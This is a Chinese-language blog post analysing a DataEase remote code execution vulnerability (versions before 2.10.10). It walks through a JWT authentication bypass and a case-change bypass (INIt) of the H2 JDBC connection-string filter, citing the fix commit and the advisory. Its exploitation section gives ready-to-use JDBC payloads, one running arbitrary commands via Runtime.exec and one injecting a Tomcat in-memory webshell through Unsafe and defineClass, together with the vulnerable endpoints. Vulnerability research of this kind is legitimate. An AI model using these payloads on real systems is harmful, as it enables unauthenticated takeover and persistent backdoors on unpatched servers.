
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cwkiller/p/18957721" title="发布于 2025-06-30 14:24">
    <span role="heading" aria-level="2">DataEase 远程代码执行漏洞分析</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        漏洞描述 DataEase 是一款开源的数据可视化分析工具，旨在帮助用户快速分析数据并洞察业务趋势，
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="漏洞描述">漏洞描述</h2>
<p><strong>DataEase</strong> 是一款开源的数据可视化分析工具，旨在帮助用户快速分析数据并洞察业务趋势，从而实现业务的改进与优化。</p>
<p><strong>漏洞影响版本：</strong> DataEase &lt; 2.10.10</p>
<p><strong>漏洞详情：</strong> 在过滤H2 JDBC连接字符串时存在大小写绕过，攻击者可配合JWT鉴权逻辑缺陷，构造特定的JDBC连接字符串执行任意代码，造成前台远程代码执行。</p>
<hr>
<h2 id="环境搭建">环境搭建</h2>
<p>下载一键安装包：</p>
<pre><code>https://github.com/dataease/dataease/releases/download/v2.10.9/dataease-online-installer-v2.10.9-ce.tar.gz
</code></pre>
<ol>
<li>
<p><strong>解压并执行安装脚本</strong></p>
</li>
<li>
<p><strong>修改配置文件</strong></p>
<p><code>/opt/dataease2.0/docker-compose.yml</code></p>
</li>
</ol>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142315288-2144642757.png" alt="" loading="lazy"></p>
<ul>
<li><code>JAVA_DEBUG=true</code></li>
<li>添加端口映射 <code>5005:5005</code> 开启调试模式</li>
</ul>
<ol start="3">
<li>
<p><strong>重启服务</strong></p>
<pre><code class="language-bash">dectl restart
</code></pre>
</li>
</ol>
<hr>
<h2 id="漏洞分析">漏洞分析</h2>
<pre><code>https://github.com/dataease/dataease/commit/429f654733716bc0afc44c22effddcbede3c8de5
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142316831-596051659.png" alt="" loading="lazy"></p>
<p>从这个commit里可以发现修复了两处地方：</p>
<hr>
<h3 id="jwt鉴权逻辑缺陷">JWT鉴权逻辑缺陷</h3>
<p><strong>位置：</strong> <code>io.dataease.auth.filter.CommunityTokenFilter#doFilter</code></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142319434-465064776.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142320233-1334575585.png" alt="" loading="lazy"></p>
<ol>
<li><strong>从请求头获取JWT：</strong> 从 <code>X-DE-TOKEN</code> 获取jwt进行验证</li>
<li><strong>验证异常处理：</strong> 验证异常后设置返回包但没有结束整个流程，会继续进入到 <code>filterChain.doFilter</code></li>
<li><strong>绕过条件：</strong> 如果单看这里的话实际上只要 <code>X-DE-TOKEN</code> 不为空即可通过权限校验流程</li>
</ol>
<p><strong>实际测试发现的问题：</strong></p>
<p><strong>第一个原因：</strong> 获取jwt的密钥是从jwt解析的uid然后通过uid获取用户密码再md5的值，如果获取的uid值不存在的话会直接异常，不会进入下面的异常，所以还是要一个存在的uid值。</p>
<p><strong>第二个原因：</strong> TokenFilter过滤器也验证了 <code>X-DE-TOKEN</code></p>
<p><strong>位置：</strong> <code>io.dataease.auth.filter.TokenFilter#doFilter</code></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142321072-817661701.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142321580-1539870162.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142322311-1455512918.png" alt="" loading="lazy"></p>
<ul>
<li>仅验证了 <code>X-DE-TOKEN</code> 长度大于100</li>
<li>uid值不为空</li>
<li><strong>没有进行密钥验证</strong></li>
</ul>
<p><strong>综合上述分析需要满足下列条件：</strong></p>
<ul>
<li>uid值需要为存在的值</li>
<li><code>X-DE-TOKEN</code> 长度大于100</li>
<li>oid不需要都可以</li>
</ul>
<p><strong>官方安全公告：</strong></p>
<pre><code>https://github.com/dataease/dataease/security/advisories/GHSA-999m-jv2p-5h34
</code></pre>
<p>官方公告这里是填了oid的，其实可以不需要oid，随便写什么让生成的jwt长度大于100即可</p>
<hr>
<h3 id="h2-jdbc-rce大小写绕过分析">H2 JDBC RCE大小写绕过分析</h3>
<p><strong>位置：</strong> <code>io.dataease.datasource.type.H2#getJdbc</code></p>
<p><strong>触发点：</strong></p>
<ul>
<li><code>/de2api/datasource/validate</code></li>
<li><code>/de2api/datasource/getSchema</code> （POC一模一样）</li>
</ul>
<p>直接登录后台即可发现这个功能点</p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142328786-1672503332.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142329416-78857961.png" alt="" loading="lazy"></p>
<p>不需要审计黑盒都可以测试出来，点击这两个功能即可构造出数据包。</p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142330151-1172016600.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142332312-904537139.png" alt="" loading="lazy"></p>
<p><strong>绕过方法：</strong></p>
<p>将 <code>INIT</code> 改为 <code>INIt</code> 即可绕过下面的过滤</p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142333083-310765266.png" alt="" loading="lazy"></p>
<hr>
<h2 id="漏洞利用">漏洞利用</h2>
<p>使用如下JDBC payload即可RCE：</p>
<pre><code class="language-json">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIt=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;return "test"\;}'\;CALL EXEC ('touch /tmp/1')
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142333736-935160621.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142334521-1140704810.png" alt="" loading="lazy"></p>
<hr>
<h3 id="内存马注入">内存马注入</h3>
<p>最开始直接使用java-chains生成JDBCPayload发现不行，有两个原因：</p>
<p><strong>1. JDK版本问题</strong><br>
<code>DataEase2.10.9</code> JDK版本为21</p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142338772-1760751039.png" alt="" loading="lazy"></p>
<p><strong>2. Tomcat版本问题</strong><br>
使用的tomcat版本为10</p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142339353-1968841531.png" alt="" loading="lazy"></p>
<p>折腾了一下最后使用如下JDBCPayload即可成功打入内存马（需注意转义问题）：</p>
<pre><code class="language-json">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIt=CREATE ALIAS AQWSSSAZ AS 'String shellexec(String abc) throws java.lang.Exception{byte[] standBytes=null\;String tomcatStr=""\;
java.lang.Class unsafeClass = java.lang.Class.forName("sun.misc.Unsafe")\;
java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe")\;
unsafeField.setAccessible(true)\;
sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null)\;
java.lang.Module module = java.lang.Object.class.getModule()\;
java.lang.Class cls = AQWSSSAZ.class\;
long offset = unsafe.objectFieldOffset(java.lang.Class.class.getDeclaredField("module"))\;
unsafe.getAndSetObject(cls, offset, module)\;
java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, java.lang.Integer.TYPE, java.lang.Integer.TYPE)\;
defineClass.setAccessible(true)\;
byte[] bytecode = java.util.Base64.getDecoder().decode(tomcatStr)\;
java.lang.Class clazz = (java.lang.Class) defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length)\;
clazz.newInstance()\;return "test"\;}'\;CALL AQWSSSAZ('123')
</code></pre>
<p><strong>tomcatStr使用jmg生成</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142339933-1729881681.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142340911-1759872522.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/858505/202506/858505-20250630142341720-751825973.png" alt="" loading="lazy"></p>
<hr>
<p><em>本文仅供安全研究和学习使用，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，公众号及文章作者不为此承担任何责任。</em></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-06-30 14:24">2025-06-30 14:24</span>&nbsp;
<a href="https://www.cnblogs.com/cwkiller">cwkiller</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18957721);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18957721', targetLink: 'https://www.cnblogs.com/cwkiller/p/18957721', title: 'DataEase 远程代码执行漏洞分析' })">举报</a>
</div>
        